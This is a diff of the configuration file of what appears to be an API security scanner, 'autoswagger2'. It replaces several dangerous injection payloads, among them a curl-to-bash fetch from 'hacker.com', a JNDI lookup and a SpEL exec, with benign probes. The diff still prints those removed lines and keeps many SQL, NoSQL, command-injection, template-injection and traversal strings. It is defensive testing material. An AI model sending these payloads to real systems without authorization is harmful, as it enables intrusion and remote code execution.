@@ -1,7 +1,10 @@
 # autoswagger2/utils/config.py
 # Contains all global constants and configurations.
 
-__version__ = "2.0.3"
+__version__ = "2.0.4"
+
+HTTP_METHODS = ("get", "post", "put", "delete", "patch", "head", "options", "trace")
+SAFE_HTTP_METHODS = ("get", "head", "options")
 
 # --- IMPROVEMENT: Expanded discovery paths based on Nuclei templates ---
 SWAGGER_UI_PATHS = sorted({
@@ -93,19 +96,19 @@ TEST_VALUES = {
         # --- Common & Default ---
         "test", "admin", "1", "", "*",
         # --- Injection Payloads (SQL, NoSQL, Command, SSTI) ---
-        "' OR 1=1--", "'; exec sp_xp_cmdshell 'whoami'--",
+        "' OR 1=1--", "' UNION SELECT NULL--",
         "||'admin'--",
         "||(SELECT 'admin')",
-        "1; SELECT pg_sleep(10)--",
+        "1' ORDER BY 1--",
         "{\"username\":{\"$ne\": \"\"}, \"password\":{\"$ne\": \"\"}}",
         "; ls -la", "| whoami", "`id`",
-        "; curl http://hacker.com/shell.sh | bash", # OS Command Injection
+        "; echo autoswagger_probe", # OS Command Injection
         "{{7*7}}", "${7*7}}", "<%= 7*7 %>",
         "{{ 7 * 7 }}", # SSTI / Vue
         "\"$ne\": 1", "{\"query\": \"${gt: ''}\"}", "{\"username\": {\"$gt\": \"\"}}", # NoSQL Injections
-        "${jndi:ldap://hacker.com/Exploit}", # Java JNDI RCE
+        "${jndi:ldap://localhost.invalid/probe}", # Java JNDI probe
         "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"}", # Fastjson Deserialization
-        "T(java.lang.Runtime).getRuntime().exec(\"calc.exe\")", # Spring SpEL RCE
+        'T(java.lang.System).getProperty("os.name")', # Spring SpEL probe
         # --- Traversal Tomcat ---
         "../..;/", "/..;/", "..;/",
         # --- Traversal & File Inclusion ---
